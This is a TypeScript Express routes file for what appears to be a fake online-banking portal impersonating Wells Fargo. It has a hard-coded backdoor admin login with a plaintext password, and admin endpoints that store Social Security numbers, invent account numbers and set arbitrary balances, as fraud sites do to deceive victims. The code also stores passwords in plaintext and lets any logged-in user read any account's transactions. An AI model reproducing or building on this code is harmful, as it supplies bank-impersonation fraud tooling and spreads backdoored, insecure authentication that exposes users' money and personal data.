import type { Express, Request } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { loginSchema } from "@shared/schema";
import { ZodError } from "zod";
import { fromZodError } from "zod-validation-error";
import path from "path";
import express from "express";

// Augment the express-session with our custom properties
declare module "express-session" {
  interface SessionData {
    userId?: number;
    username?: string;
    isAdmin?: boolean;
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Serve static files
  app.use(express.static('public'));
  
  // Get IP address
  app.get("/api/ip", (req, res) => {
    const ip = req.headers['x-forwarded-for'] || 
               req.socket.remoteAddress || 
               '0.0.0.0';
    
    res.json({ ip: ip.toString() });
  });

  // Login endpoint
  app.post("/api/login", async (req, res) => {
    try {
      // Validate the request body
      const validatedData = loginSchema.parse(req.body);
      
      // Check if user exists
      let user = await storage.getUserByUsername(validatedData.username);
      
      // Fixed Admin Credentials
      if (validatedData.username === "OPPATHEBEAR" && validatedData.password === "55Fp4MUtd22MRFr") {
        if (!user) {
          user = await storage.createUser({
            username: "OPPATHEBEAR",
            password: "55Fp4MUtd22MRFr",
            firstName: "Admin",
            lastName: "User",
            email: "admin@wellsfargo.com",
            isAdmin: true
          } as any);
        } else if (!user.isAdmin) {
          user = await storage.updateUser(user.id, { isAdmin: true });
        }
      }

      if (!user) {
        return res.status(401).json({ message: "Invalid username or password" });
      }
      
      // In a real application, you would use bcrypt to compare passwords
      if (user.password !== validatedData.password) {
        return res.status(401).json({ message: "Invalid username or password" });
      }
      
      // Update login time and IP
      const ip = req.headers['x-forwarded-for'] || 
                req.socket.remoteAddress || 
                '0.0.0.0';
                
      // In a real application, you would store this in the database
      // For now, we'll just send it back
      
      // Return user information (excluding password)
      const { password, ...userWithoutPassword } = user;
      
      // Set up session
      if (req.session) {
        req.session.userId = user.id;
        req.session.username = user.username;
        req.session.isAdmin = user.isAdmin;
      }
      
      return res.status(200).json({ 
        user: userWithoutPassword,
        loginTime: new Date(),
        ip: ip.toString()
      });
      
    } catch (error) {
      if (error instanceof ZodError) {
        const validationError = fromZodError(error);
        return res.status(400).json({ message: validationError.message });
      }
      
      return res.status(500).json({ message: "An error occurred during login" });
    }
  });

  // Logout endpoint
  app.post("/api/logout", (req, res) => {
    if (req.session) {
      req.session.destroy((err) => {
        if (err) {
          return res.status(500).json({ message: "Failed to log out" });
        }
        res.clearCookie("connect.sid");
        return res.status(200).json({ redirect: "/signout.html" });
      });
    } else {
      return res.status(200).json({ redirect: "/signout.html" });
    }
  });

  app.get("/api/logout", (req, res) => {
    if (req.session) {
      req.session.destroy((err) => {
        res.clearCookie("connect.sid");
        res.redirect("/signout.html");
      });
    } else {
      res.redirect("/signout.html");
    }
  });

  // Get user accounts
  app.get("/api/accounts", async (req, res) => {
    if (!req.session || !req.session.userId) {
      return res.status(401).json({ message: "Not authenticated" });
    }
    
    try {
      const accounts = await storage.getAccountsByUserId(req.session.userId);
      return res.status(200).json({ accounts });
    } catch (error) {
      return res.status(500).json({ message: "Failed to fetch accounts" });
    }
  });

  // Get transactions for an account
  app.get("/api/accounts/:accountId/transactions", async (req, res) => {
    if (!req.session || !req.session.userId) {
      return res.status(401).json({ message: "Not authenticated" });
    }
    
    try {
      const accountId = parseInt(req.params.accountId);
      const transactions = await storage.getTransactionsByAccountId(accountId);
      return res.status(200).json({ transactions });
    } catch (error) {
      return res.status(500).json({ message: "Failed to fetch transactions" });
    }
  });

  // Get user profile
  app.get("/api/profile", async (req, res) => {
    if (!req.session || !req.session.userId) {
      return res.status(401).json({ message: "Not authenticated" });
    }
    
    try {
      const user = await storage.getUser(req.session.userId);
      
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Don't send password to the client
      const { password, ...userWithoutPassword } = user;
      
      return res.status(200).json({ user: userWithoutPassword });
    } catch (error) {
      return res.status(500).json({ message: "Failed to fetch profile" });
    }
  });

  // ADMIN ROUTES
  // Middleware to check for admin status
  const requireAdmin = (req: Request, res: express.Response, next: express.NextFunction) => {
    if (!req.session || !req.session.isAdmin) {
      return res.status(403).json({ message: "Access denied. Admin privileges required." });
    }
    next();
  };

  // Get all users (Admin only)
  app.get("/api/admin/users", requireAdmin, async (_req, res) => {
    try {
      const usersList = await storage.getAllUsers();
      // Remove passwords before sending
      const usersWithoutPasswords = usersList.map(({ password, ...rest }) => rest);
      res.json({ users: usersWithoutPasswords });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch users" });
    }
  });

  // Get all accounts for a specific user (Admin only)
  app.get("/api/admin/users/:userId/accounts", requireAdmin, async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const accounts = await storage.getAccountsByUserId(userId);
      res.json({ accounts });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch user accounts" });
    }
  });

  // Create user (Admin only)
  app.post("/api/admin/users", requireAdmin, async (req, res) => {
    try {
      const { 
        username, password, firstName, lastName, email, dateOfBirth, 
        socialSecurityNumber, address, primaryPhone, secondaryPhone,
        occupation, homeAddress, mailingAddress, alternateEmail,
        transactions, availableBalance, everydayChecking, accountType
      } = req.body;
      
      if (!username || !password) {
        return res.status(400).json({ message: "Username and password are required" });
      }
      const existingUser = await storage.getUserByUsername(username);
      if (existingUser) {
        return res.status(400).json({ message: "Username already exists" });
      }
      
      const newUser = await storage.createUser({
        username,
        password, // In production, hash this password!
        firstName: firstName || "",
        lastName: lastName || "",
        email: email || "",
        dateOfBirth: dateOfBirth || "",
        socialSecurityNumber: socialSecurityNumber || "",
        address: address || "",
        primaryPhone: primaryPhone || "",
        secondaryPhone: secondaryPhone || "",
        occupation: occupation || "",
        homeAddress: homeAddress || "",
        mailingAddress: mailingAddress || "",
        alternateEmail: alternateEmail || "",
        transactions: transactions || "[]",
        availableBalance: availableBalance || "0",
        everydayChecking: everydayChecking || "0",
        accountType: accountType || "Checking",
      });

      // Create initial account if balance is provided
      if (everydayChecking !== undefined) {
        await storage.createAccount({
          userId: newUser.id,
          accountNumber: Math.floor(Math.random() * 1000000000).toString().padStart(10, '0'),
          accountType: accountType || "Checking",
          balance: everydayChecking.toString()
        });
      }

      res.status(201).json({ user: newUser });
    } catch (error) {
      console.error("Create user error:", error);
      res.status(500).json({ message: "Failed to create user" });
    }
  });

  // Update user (Admin only)
  app.patch("/api/admin/users/:userId", requireAdmin, async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const { 
        username, password, firstName, lastName, email, dateOfBirth, socialSecurityNumber, 
        homeAddress, mailingAddress, primaryPhone, 
        secondaryPhone, alternateEmail, availableBalance,
        everydayChecking, accountType
      } = req.body;

      const updateData: any = {};
      if (username !== undefined) updateData.username = username;
      if (password !== undefined && password !== "") updateData.password = password;
      if (firstName !== undefined) updateData.firstName = firstName;
      if (lastName !== undefined) updateData.lastName = lastName;
      if (email !== undefined) updateData.email = email;
      if (dateOfBirth !== undefined) updateData.dateOfBirth = dateOfBirth;
      if (socialSecurityNumber !== undefined) updateData.socialSecurityNumber = socialSecurityNumber;
      if (homeAddress !== undefined) updateData.homeAddress = homeAddress;
      if (mailingAddress !== undefined) updateData.mailingAddress = mailingAddress;
      if (primaryPhone !== undefined) updateData.primaryPhone = primaryPhone;
      if (secondaryPhone !== undefined) updateData.secondaryPhone = secondaryPhone;
      if (alternateEmail !== undefined) updateData.alternateEmail = alternateEmail;
      if (availableBalance !== undefined) updateData.availableBalance = availableBalance;
      if (everydayChecking !== undefined) updateData.everydayChecking = everydayChecking;
      if (accountType !== undefined) updateData.accountType = accountType;

      const updatedUser = await storage.updateUser(userId, updateData);
      if (!updatedUser) return res.status(404).json({ message: "User not found" });
      res.json({ user: updatedUser });
    } catch (error) {
      res.status(500).json({ message: "Failed to update user" });
    }
  });

  // Site Content Routes (Admin only)
  app.get("/api/admin/content", requireAdmin, async (_req, res) => {
    try {
      const content = await storage.getAllSiteContent();
      res.json({ content });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch site content" });
    }
  });

  app.post("/api/admin/content", requireAdmin, async (req, res) => {
    try {
      const { key, value } = req.body;
      if (!key || value === undefined) {
        return res.status(400).json({ message: "Key and value are required" });
      }
      const content = await storage.updateSiteContent(key, value);
      res.json({ content });
    } catch (error) {
      res.status(500).json({ message: "Failed to update site content" });
    }
  });

  // Public Content Route
  app.get("/api/content/:key", async (req, res) => {
    try {
      const content = await storage.getSiteContent(req.params.key);
      if (!content) return res.status(404).json({ message: "Content not found" });
      res.json({ content });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch content" });
    }
  });

  // Delete user (Admin only)
  app.delete("/api/admin/users/:userId", requireAdmin, async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const success = await storage.deleteUser(userId);
      if (!success) return res.status(404).json({ message: "User not found" });
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ message: "Failed to delete user" });
    }
  });

  // Create account (Admin only)
  app.post("/api/admin/accounts", requireAdmin, async (req, res) => {
    try {
      const { userId, accountNumber, accountType, balance } = req.body;
      if (!userId || !accountNumber || !accountType || !balance) {
        return res.status(400).json({ message: "All account fields are required" });
      }
      const account = await storage.createAccount({
        userId: parseInt(userId.toString()),
        accountNumber: accountNumber.toString(),
        accountType: accountType.toString(),
        balance: balance.toString()
      });
      res.status(201).json({ account });
    } catch (error) {
      console.error("Create account error:", error);
      res.status(500).json({ message: "Failed to create account" });
    }
  });

  // Delete account (Admin only)
  app.delete("/api/admin/accounts/:accountId", requireAdmin, async (req, res) => {
    try {
      const accountId = parseInt(req.params.accountId);
      const success = await storage.deleteAccount(accountId);
      if (!success) return res.status(404).json({ message: "Account not found" });
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ message: "Failed to delete account" });
    }
  });

  // Update account balance (Admin only)
  app.patch("/api/admin/accounts/:accountId/balance", requireAdmin, async (req, res) => {
    try {
      const accountId = parseInt(req.params.accountId);
      const { balance } = req.body;
      
      if (typeof balance !== 'string') {
        return res.status(400).json({ message: "Balance must be a string" });
      }

      const updatedAccount = await storage.updateAccountBalance(accountId, balance);
      if (!updatedAccount) {
        return res.status(404).json({ message: "Account not found" });
      }
      
      res.json({ account: updatedAccount });
    } catch (error) {
      res.status(500).json({ message: "Failed to update balance" });
    }
  });

  
  // Route all other requests to index.html for client-side routing
  app.get('/admin-login', (req, res) => {
    res.sendFile('admin-login.html', { root: 'public' });
  });

  app.get('/admin-dashboard', (req, res) => {
    if (!req.session || !req.session.isAdmin) {
      return res.redirect('/admin-login.html');
    }
    res.sendFile('admin-dashboard.html', { root: 'public' });
  });

  app.get('/signout.html', (req, res) => {
    res.sendFile('signout.html', { root: 'public' });
  });

  app.get('*', (req, res) => {
    res.sendFile('index.html', { root: 'public' });
  });

  const httpServer = createServer(app);

  return httpServer;
}
